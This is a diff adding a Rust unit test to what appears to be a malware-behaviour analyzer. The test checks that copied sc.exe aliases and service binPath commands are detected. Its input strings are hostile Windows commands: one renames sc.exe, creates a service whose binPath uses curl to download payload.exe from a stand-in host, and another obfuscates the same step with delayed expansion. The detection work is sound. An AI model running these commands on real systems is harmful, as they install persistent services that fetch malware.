@@ -40015,6 +40015,43 @@ mod service_install_tests {
     }
 
     #[test]
+    fn copied_sc_alias_create_binpath_cmd_child_is_analyzed() {
+        let script = br#"copy C:\Windows\System32\sc.exe C:\Users\Public\svc.tmp
+C:\Users\Public\svc.tmp create UpdateSvc binPath= "cmd.exe /c curl -o payload.exe https://copied-sc-binpath.example/payload.exe""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target == r#"C:\Users\Public\svc.tmp"#
+            )),
+            "copied sc alias did not emit manipulated execution: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ServiceInstall { service_name, bin_path }
+                    if service_name == "UpdateSvc"
+                        && bin_path.contains("copied-sc-binpath.example")
+            )),
+            "copied sc service install trait missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://copied-sc-binpath.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "copied sc binPath child command was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn sc_config_binpath_cmd_child_is_analyzed() {
         let script = br#"sc config UpdateSvc binPath= "cmd.exe /V:ON /c set U=https://sc-config-binpath.example/payload.exe&&curl -o payload.exe !U!""#;
         let report = analyze(script, &Config::default());
